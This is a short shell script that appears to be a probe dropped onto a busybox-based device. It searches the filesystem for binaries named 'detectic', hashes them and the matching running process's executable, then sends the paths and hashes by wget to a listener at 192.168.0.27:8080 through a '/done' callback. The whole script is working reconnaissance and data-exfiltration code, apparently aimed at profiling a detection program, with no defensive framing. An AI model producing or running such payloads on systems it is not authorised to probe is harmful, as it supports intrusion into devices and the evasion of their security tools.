#!/bin/sh
# Detectic binary finder — searches all possible paths
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox

# Find ALL files named 'detectic' anywhere
BINS=$($BB find / -name 'detectic' -type f 2>/dev/null)

# For each, compute SHA
RESULT=""
for b in $BINS; do
    SHA=$($BB sha256sum "$b" 2>/dev/null | $BB awk '{print $1}')
    RESULT="${RESULT}bin=${b},sha=${SHA};"
done

# Also check /proc/$PID/exe for the running process
PID=$($BB ps | $BB grep -i detectic | $BB grep -v grep | $BB head -1 | $BB awk '{print $1}')
if [ -n "$PID" ] && [ -d "/proc/$PID" ]; then
    EXE=$($BB readlink /proc/$PID/exe 2>/dev/null)
    if [ -n "$EXE" ] && [ -f "$EXE" ]; then
        EXE_SHA=$($BB sha256sum "$EXE" 2>/dev/null | $BB awk '{print $1}')
        RESULT="${RESULT}exe=${EXE},sha=${EXE_SHA};"
    fi
fi

# Send via /done callback (proven working pattern)
CALLBACK="http://192.168.0.27:8080"
# URL-encode the result (replace spaces and special chars)
RESULT_ENC=$($BB echo "$RESULT" | $BB sed 's/ /_/g' | $BB sed 's/\//|/g')
$BB wget -q -T 5 -O /dev/null "${CALLBACK}/done?status=ok&reason=find_probe&pid=${PID}&data=${RESULT_ENC}" 2>/dev/null || true
